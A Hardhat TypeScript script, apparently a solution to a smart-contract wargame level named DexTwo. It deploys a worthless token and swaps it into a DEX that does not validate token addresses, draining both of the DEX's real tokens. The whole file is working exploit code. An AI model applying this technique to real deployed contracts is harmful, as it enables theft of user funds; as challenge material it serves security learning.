import 'dotenv/config'
import { ethers } from 'hardhat'
import { DexTwo } from '../types/typechain/DexTwo'
import { SwappableTokenTwo } from '../types/typechain/SwappableTokenTwo'

async function main() {
  const targetAddr = '0x13c40eA0d669254957e71467000A1bC11400F4c8'

  const attacker = new ethers.Wallet(
    process.env.DEV_WALLET as string,
    ethers.provider
  )

  const dexfactory = await ethers.getContractFactory('DexTwo', attacker)
  const target = dexfactory.attach(targetAddr) as DexTwo

  const tokenFactory = await ethers.getContractFactory(
    'SwappableTokenTwo',
    attacker
  )
  const exploitToken = (await tokenFactory.deploy(
    'EXP',
    'E',
    100000
  )) as SwappableTokenTwo

  console.log('Deploying EXP Token...')
  await exploitToken.deployed()
  console.log('Transfering EXP to DEX...')

  const tokenTransfer = await exploitToken.transfer(target.address, 100, {
    gasLimit: 800000
  })
  await tokenTransfer.wait()

  console.log('Approving DEX...')
  await exploitToken.approve(target.address, 300)

  console.log('Token transfered...')
  console.log('Executing swaps...')

  const swap1 = await target.swap(
    exploitToken.address,
    await target.token1(),
    100,
    {
      gasLimit: 800000
    }
  )

  const swap2 = await target.swap(
    exploitToken.address,
    await target.token2(),
    200,
    {
      gasLimit: 800000
    }
  )

  await Promise.all([swap1.wait(), swap2.wait()])

  console.log('Exploit executed successfully ᕦ(ò_óˇ)ᕤ')
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
